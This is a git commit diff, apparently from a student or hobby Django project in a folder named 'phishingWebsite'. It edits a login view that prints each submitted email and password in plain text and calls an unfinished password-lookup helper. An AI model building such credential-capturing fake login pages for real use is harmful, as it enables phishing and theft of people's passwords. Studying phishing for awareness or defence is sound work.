1865c4c1d3b8dd1c3987f08eac39c90983b92c7d
Tobisius <Tobias.steenberg@outlook.dk>
2026-03-17 15:21:25 +0100

    GG
    Det virker ikke, vi er cooked chat

--- Website/phishingWebsite/login/views.py
+++ Website/phishingWebsite/login/views.py
@@ -1,15 +1,23 @@
 from django.shortcuts import render
 from django.shortcuts import redirect
 from django.http import HttpResponse
+from sqlmanager import *
+
+tableName = "UserData"
 
 def index(request):
     if request.method == "POST":
-        username = request.POST.get("username")
+        email = request.POST.get("email")
         password = request.POST.get("password")
-        print(f"Username: {username}, Password: {password}")
+        print(f"Email: {email}, Password: {password}")
+        
+        getHashedPassword(tableName, email)
+        
+        
         return redirect("loginSuccess")
 
     return render(request, 'login/loginPage.html')
 
 def loginSuccess(request):
     return HttpResponse("Login Success")
+
